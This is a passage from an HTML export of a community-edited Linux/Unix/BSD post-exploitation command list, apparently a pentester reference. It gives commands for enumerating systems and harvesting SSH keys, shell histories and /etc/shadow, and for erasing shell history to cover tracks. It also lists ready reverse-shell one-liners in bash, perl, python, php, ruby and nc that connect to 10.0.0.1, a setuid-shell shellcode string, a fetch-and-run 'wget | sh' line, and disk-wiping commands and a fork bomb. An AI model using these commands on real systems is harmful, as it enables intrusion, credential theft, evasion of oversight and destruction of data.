well<br></span></li></ol><h2 class="c5"><a name="h.u3q03osix6gd"></a><span>Installed Packages</span></h2><ol class="c7" start="1"><li class="c1"><span>rpm -qa --last | head</span></li><li class="c1"><span>yum list | grep installed</span></li><li class="c1"><span>Debian:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dpkg -l</span></li></ol><p class="c54 c5"><span>dpkg -l | grep -i &ldquo;linux-image&rdquo;</span></p><p class="c5 c54"><span>dpkg --get-selections</span></p><ol class="c7" start="4"><li class="c1"><span>{Free,Net}BSD:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pkg_info</span></li><li class="c1"><span>Solaris:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pkginfo</span></li><li class="c1"><span>Gentoo:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# equery must be installed</span></li></ol><p class="c41 c5 c45"><span>cd /var/db/pkg/ &amp;&amp; ls -d */*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# always works</span></p><ol class="c7" start="7"><li class="c1"><span>Arch Linux:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>pacman -Q<br></span></li></ol><h2 class="c5 c53"><a name="h.fapd4nugyr42"></a><span>Package Sources</span></h2><ol class="c7" start="1"><li class="c1"><span>cat /etc/apt/sources.list</span></li></ol><ol class="c7" start="1"><li class="c1"><span>ls -l /etc/yum.repos.d/</span></li><li class="c1"><span>cat /etc/yum.conf<br></span></li></ol><h2 class="c5"><a name="h.s5cidyjukhu9"></a><span>Finding Important Files</span></h2><ol class="c7" start="1"><li class="c1"><span class="c12 c38">ls -dlR */ </span><span>#</span></li><li class="c1"><span class="c38 c12">ls -alR | grep ^d</span></li><li class="c1"><span class="c38 c12">find /var -type d</span></li><li class="c1"><span class="c38 c12">ls -dl `find /var -type d`</span></li><li class="c1"><span class="c38 c12">ls -dl `find /var -type d` | grep -v root</span></li><li class="c1"><span class="c38 c12">find /var ! -user root -type d -ls</span></li><li class="c1"><span>find /var/log -type f -exec ls -la {} \;</span></li><li class="c1"><span>find / -perm -4000 (find all suid files)</span></li><li class="c1"><span>ls -alhtr /mnt</span></li><li class="c1"><span>ls -alhtr /media</span></li><li class="c1"><span>ls -alhtr /tmp</span></li><li class="c1"><span>ls -alhtr /home</span></li><li class="c1"><span>cd /home/; treels /home/*/.ssh/*</span></li><li class="c1"><span>find /home -type f -iname &#39;.*history&#39;</span></li><li class="c1"><span>ls -lart /etc/rc.d/</span></li><li class="c1"><span>locate tar | grep [.]tar$ &nbsp;# Remember to updatedb before running locate</span></li><li class="c1"><span>locate tgz | grep [.]tgz$</span></li><li class="c1"><span>locate sql | grep [.]sql$</span></li><li class="c1"><span>locate settings | grep [.]php$ &nbsp;</span></li><li class="c1"><span>locate config.inc | grep [.]php$</span></li></ol><ol class="c7" start="1"><li class="c1"><span>ls /home/*/id*</span></li><li class="c1"><span>&nbsp;.properties | grep [.]properties # java config files</span></li><li class="c1"><span>locate .xml | grep [.]xml # java/.net config files</span></li><li class="c1"><span>find /sbin /usr/sbin /opt /lib `echo $PATH | &lsquo;sed s/:/ /g&rsquo;` -perm /6000 &nbsp;-ls # find suids</span></li><li class="c1"><span>locate rhosts</span></li></ol><h1 class="c5"><a name="h.54mlnuvovzfr"></a><span>Covering Your Tracks</span></h1><h2 class="c5"><a name="h.vzdepznkca6s"></a><span>Avoiding history filesmys</span></h2><ol class="c7" start="1"><li class="c1"><span>export HISTFILE=</span></li></ol><p class="c5 c41"><span>or </span></p><ol class="c7" start="2"><li class="c1"><span>unset HISTFILE</span></li></ol><p class="c5"><span>This next one might not be a good idea, because a lot of folks know to check for tampering with this file, and will be suspicious if they find out:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p><p class="c5 c3"><span></span></p><p class="c5"><span>However if you happen to be on an account that was originally inaccessible, if the .bash_history file is available (ls -a ~), viewcating its contents can provide you with a good deal of information about the system and its most recent updates/changes. &nbsp;</span></p><p class="c5"><span>clear all history in ram</span></p><ol class="c7" start="1"><li class="c1"><span>history -c</span></li><li class="c1"><span>rm -rf ~/.bash_history &amp;&amp; ln -s ~/.bash_history /dev/null (</span><span class="c46">invasive</span><span>)</span></li></ol><ol class="c7" start="1"><li class="c1"><span>touch ~/.bash_history (</span><span class="c46">invasive</span><span>)</span></li><li class="c1"><span>&lt;space&gt; history -c (using a space before a command)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="c1"><span>zsh% unset HISTFILE HISTSIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="c1"><span>tcsh% set history=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="c1"><span>bash$ set +o history</span></li><li class="c1"><span>ksh$ unset HISTFILE</span></li><li class="c1"><span>find / -type f -exec {} (forensics nightmare)</span></li></ol><p class="c5 c3"><span></span></p><p class="c5"><span>Note that you&rsquo;re probably better off modifying or temporary disabling rather than deleting history files, it leaves a lot less traces and is less suspect.</span></p><p class="c5 c3"><span></span></p><p class="c5"><span>In some cases HISTFILE and HISTFILESIZE are made read-only; get around this by explicitly clearing history (</span><span class="c12">history -c</span><span>) or by </span><span class="c12">kill -9 $$</span><span>&rsquo;ing the shell. Sometimes the shell can be configured to run &lsquo;history -w&rsquo; after every command; get around this by overriding &lsquo;history&rsquo; with a no-op shell function. None of this will help if the shell is configured to log everything to syslog, however.</span></p><h1 class="c5"><a name="h.gujnz588ipum"></a><span>Obtain users&rsquo; </span><span>information</span></h1><ol class="c7" start="1"><li class="c1"><span>ls -alh /home/*/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="c1"><span>ls -alh /home/*/.ssh/</span></li><li class="c1"><span>cat /home/*/.ssh/authorized_keys</span></li><li class="c1"><span>cat /home/*/.ssh/known_hosts</span></li><li class="c1"><span>cat /home/*/.*hist* # you can learn a lot from this</span></li><li class="c1"><span>find /home/*/.vnc /home/*/.subversion -type f </span></li><li class="c1"><span>grep ^ssh /home/*/.*hist*</span></li><li class="c1"><span>grep ^telnet `/home/*/.*hist*</span></li><li class="c1"><span>grep ^mysql /home/*/.*hist*</span></li><li class="c1"><span>cat /home/*/.viminfo</span></li></ol><ol class="c7" start="1"><li class="c1"><span>sudo -l # if sudoers is not. readable, this sometimes works per user</span></li><li class="c1"><span>crontab -l</span></li><li class="c1"><span>cat /home/*/.mysql_history<br></span></li></ol><h1 class="c5"><a name="h.q15hrwe7gcze"></a><span>Escalating</span></h1><h2 class="c5"><a name="h.wrbsvpym06p8"></a><span>Looking for possible opened paths</span></h2><ol class="c7" start="1"><li class="c1"><span>ls -alh /root/</span></li><li class="c1"><span>sudo -l</span></li><li class="c1"><span>cat /etc/sudoers</span></li><li class="c1"><span>cat /etc/shadow</span></li><li class="c1"><span>cat /etc/master.passwd # OpenBSD</span></li><li class="c1"><span>cat /var/spool/cron/crontabs/* | cat /var/spool/cron/*</span></li><li class="c1"><span class="c56">lsof -nPi</span></li><li class="c1"><span>ls /home/*/.ssh/*<br></span></li></ol><h1 class="c5"><a name="h.dkwcpqk6tonc"></a><span>Maintaining control</span></h1><h2 class="c5"><a name="h.q5twgc79wzow"></a><span>Reverse Shell</span></h2><p class="c5"><span>Starting list sourced from:</span><span class="c26"><a class="c19" href="http://www.google.com/url?q=http%3A%2F%2Fpentestmonkey.net%2Fcheat-sheet%2Fshells%2Freverse-shell-cheat-sheet&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFxX7D4XrJV999xsFEVnml66qvHZA">&nbsp;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></span></p><ol class="c7" start="1"><li class="c1"><span>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 </span><span>(No /dev/tcp on older Debians, but use nc, socat, TCL, awk or any interpreter like Python, and so on.).</span></li><li class="c1"><span>perl</span><span>&nbsp;-e &#39;use Socket; $i=&quot;10.0.0.1&quot;; $p=1234; socket(S,PF_INET, SOCK_STREAM, getprotobyname(&quot;tcp&quot;)); if(connect(S,sockaddr_in($p,inet_aton($i)))){ open(STDIN,&quot;&gt;&amp;S&quot;); open(STDOUT,&quot;&gt;&amp;S&quot;); open(STDERR,&quot;&gt;&amp;S&quot;); exec(&quot;/bin/sh -i&quot;);};&#39;</span></li><li class="c1"><span>python</span><span>&nbsp;-c &#39;import socket,subprocess,os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((&quot;10.0.0.1&quot;,1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span></li><li class="c1"><span>php</span><span>&nbsp;-r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span></li><li class="c1"><span>ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i; exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span><span class="c36 c40">&nbsp;</span><span>nc -e /bin/sh 10.0.0.1 1234 # note need -l on some versions, and many does NOT support -e anymore</span></li><li class="c1"><span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</span></li><li class="c1"><span>xterm -display 10.0.0.1:1se&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li></ol><ol class="c29" start="1"><li class="c25 c5"><span>Listener- Xnest :1</span></li><li class="c25 c5"><span>Add permission to connect- xhost +victimIP</span></li></ol><ol class="c7" start="8"><li class="c1"><span>ssh -NR 3333:localhost:22 user@yourhost</span></li><li class="c1"><span>nc -e /bin/sh 10.0.0.1 1234</span></li></ol><p class="c5 c3"><span></span></p><h1 class="c5"><a name="h.hnb7rgxpzqnt"></a><span>Fun if Windows is present and accessible</span></h1><p class="c5"><span>If there is Windows installed and the logged-in user access level includes those Windows partition, attacker can mount them up and do a much deeper information gathering, credential theft and root-ing. Ntfs-3g is useful for mounting ntfs partitions read-write.</span></p><p class="c5"><span class="c12">TODO</span><span>: insert details on what to look for<br></span></p><h1 class="c5"><a name="h.199tyc28x3ns"></a><span>Stuff to be sorted</span></h1><p class="c5"><span class="c12">## GOING TO MOVE EVERYTHING HERE FOR LEGIBILITY ONCE EDITING DIES DOWN</span></p><p class="c5 c3"><span class="c12"></span></p><a href="#" name="5d418af201820547fdc4536fcfc7e6a17ad79577"></a><a href="#" name="2"></a><table cellpadding="0" cellspacing="0" class="c9"><tbody><tr><td class="c13"><p class="c5"><span class="c12">Command</span><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p></td><td class="c30"><p class="c5"><span class="c12">Output</span></p></td></tr><tr><td class="c13"><p class="c5"><span class="c14">ps aux</span><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p></td><td class="c30"><p class="c5"><span>List of running processes</span></p></td></tr><tr><td class="c13"><p class="c5"><span class="c14">id</span></p></td><td class="c30"><p class="c5"><span>List current user and group along with user/group id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p></td></tr><tr><td class="c13"><p class="c5"><span class="c14">w</span></p></td><td class="c30"><p class="c5"><span>Show info about who is logged, what are they are doing&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p></td></tr><tr><td class="c13"><p class="c5"><span class="c14">who -a</span></p></td><td class="c30"><p class="c5"><span>Print</span><span class="c12">&nbsp;</span><span>information about users&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p></td></tr><tr><td class="c13"><p class="c11 c5"><span>cat /dev/core &gt; /dev/audio</span></p><p class="c11 c5 c3"><span></span></p><p class="c11 c5"><span>cat /dev/mem &gt; /dev/audio</span></p></td><td class="c30"><p class="c11 c5"><span>Makes a sound from the memory content.</span></p><p class="c11 c5"><span class="c14">Usefulness of this??? (none, aside from pissing off the sysadmin, in the very unlikely case that the server has speakers and the legacy OSS driver)</span></p></td></tr><tr><td class="c13"><h1 class="c11 c5 c18"><a name="h.qtrf4yyf4tx2"></a><span>sudo -p</span></h1></td><td class="c30"><h1 class="c18 c11 c5"><a name="h.a649akutdkhs"></a><span>allows the user to define what the password prompt will be</span></h1><p class="c11 c5"><span>(useful for fun customization with aliases or shell scripts)</span></p></td></tr></tbody></table><h1 class="c5"><a name="h.jq00y779et7r"></a><span>Deleting and Destroying</span></h1><p class="c5"><span class="c14 c36">(If it is necessary to leave the machine inaccessible or unusable)</span></p><p class="c5"><span class="c14 c36">Note that this tends to be quite evident (as opposed to a simple exploitation that might go unnoticed for some time, even forever), and will most surely get you into troubles.</span></p><p class="c5 c3"><span class="c14 c36"></span></p><p class="c5"><span class="c14 c36">Oh, and you&rsquo;re probably a jerk if you use any of the stuff below.</span></p><a href="#" name="95e7fa14134f5d4c0c523aea4ce33e9bad9fcc05"></a><a href="#" name="3"></a><table cellpadding="0" cellspacing="0" class="c9"><tbody><tr><td class="c39"><p class="c5"><span class="c12">Command</span></p></td><td class="c6"><p class="c5"><span class="c12">Description</span></p></td></tr><tr><td class="c39"><p class="c5"><span>rm -rf /</span></p></td><td class="c6"><p class="c5"><span>This will recursively try to delete all files.</span></p></td></tr><tr class="c49"><td class="c39"><p class="c5"><span>char esp[] __attribute__ ((section(&rdquo;.text&rdquo;))) /* e.s.p release */ = &ldquo;\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68&Prime;</span></p><p class="c5"><span>&ldquo;\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99&Prime;</span></p><p class="c5 c3"><span></span></p><p class="c5"><span>&ldquo;\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7&Prime;</span></p><p class="c5"><span>&ldquo;\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56&Prime;</span></p><p class="c5"><span>&ldquo;\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31&Prime;</span></p><p class="c5"><span>&ldquo;\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69&Prime;</span></p><p class="c5"><span>&ldquo;\x6e\x2f\x73\x68\x00\x2d\x63\x00&Prime;</span></p><p class="c5"><span>&ldquo;cp -p /bin/sh /tmp/.beyond; chmod 4755 /tmp/.beyond;&rdquo;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p></td><td class="c6"><p class="c5"><span>Hex version of rm -rf /&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p><p class="c5"><span class="c14">How is this supposed to work?</span></p><p class="c5 c3"><span class="c14"></span></p></td></tr><tr><td class="c39"><p class="c5"><span>mkfs.ext3 /dev/sda</span></p></td><td class="c6"><p class="c5"><span>Reformat the device mentioned, making recovery of files hard.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p></td></tr><tr><td class="c39"><p class="c11 c5"><span>dd if=/dev/zero of=/dev/sda bs=1M</span></p></td><td class="c6"><p class="c11 c5"><span>Overwrite disk /dev/sda with zeros</span></p></td></tr></tbody></table><h2 class="c5"><a name="h.jj5mr9w034hc"></a><span>Execute a remote script</span></h2><p class="c5 c3"><span class="c14 c36"></span></p><a href="#" name="d771f0f909d715948b33ccd94a221c47791662f2"></a><a href="#" name="4"></a><table cellpadding="0" cellspacing="0" class="c9"><tbody><tr><td class="c43"><p class="c5"><span>wget http://server/file.sh -O- | sh</span></p></td><td class="c24"><p class="c5"><span>This command forces the download of a file and immediately its execution, can be exploited easily using or reverse shit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p></td></tr></tbody></table><h2 class="c5"><a name="h.hisythb6094c"></a><span>Fork Bomb</span></h2><a href="#" name="0ba32c669eadf2cfb16e5cb4407020afd8a06dda"></a><a href="#" name="5"></a><table cellpadding="0" cellspacing="0" class="c9"><tbody><tr><td class="c31"><p class="c5"><span>:(){:|:&amp;};:</span></p><p class="c5 c3"><span></span></p></td><td class="c8"><p class="c5"><span>The [in]famous &quot;fork bomb&quot;. This command will cause your system to run a large number of processes, until it &quot;hangs&quot;. This can often lead to data loss (e.g. if the user brutally reboots, or the OOM killer kills a process with unsaved work). If left alone for enough time a system can eventually recover from a fork bomb.</span></p></td></tr></tbody></table><p class="c5 c3"><span></span></p><p class="c11 c5 c3"><span></span></p><sup><a href="#cmnt1" name="cmnt_ref1">[a]</a></sup><p class="c11 c5 c3"><span></span></p><sup><a href="#cmnt2" name="cmnt_ref2">[b]</a></sup><p class="c11 c5 c3"><span></span></p><sup><a href="#cmnt3" name="cmnt_ref3">[c]</a></sup><p class="c5 c3 c11"><span></span></p><sup><a href="#cmnt4" name="cmnt_ref4">[d]</a></sup><div><p class="c5 c51"><span class="c55 c12">Linux/Unix/BSD Post Exploitation Command List - Page: </span></p></div><div class="c15"><p class="c11 c5"><a href="#cmnt_ref1" name="cmnt1">[a]</a><span>Benito Camelo:</span></p><p class="c11 c5"><span>Just for Fun &nbsp;- &quot;apt-get install sl&quot; (Distro debian based) then to any command create an alias of sl</span></p></div><div class="c15"><p class="c11 c5"><a href="#cmnt_ref2" name="cmnt2">[b]</a><span>Sherwyn Williams:</span></p><p class="c11 c5"><span>Awesome list mubix I will review and try to add some stuff once the action dies down.</span></p><hr><p class="c11 c5"><span>Rob Fuller:</span></p><p class="c11 c5"><span>Sweet!!</span></p></div><div class="c15"><p class="c11 c5"><a href="#cmnt_ref3" name="cmnt3">[c]</a><span>Jay Taylor:</span></p><p class="c11 c5"><span>Is there a place for commands to issue as root vs. non-privileged user?</span></p><hr><p class="c11 c5"><span>Rob Fuller:</span></p><p class="c11 c5"><span>Sort of, but you are welcome to make one / make it look better</span></p></div><div class="c15"><p class="c11 c5"><a href="#cmnt_ref4" name="cmnt4">[d]</a><span>vavarachen:</span></p><p class="c11 c5"><span>How about adding ~/.mysql_history to the list? &nbsp;Lot of juicy info in there, and sometimes even passwords in clear text.</span></p><hr><p class="c11 c5"><span>Rob Fuller:</span></p><p class="c11 c5"><span>Awesome, add it!</span></p></div></body></html>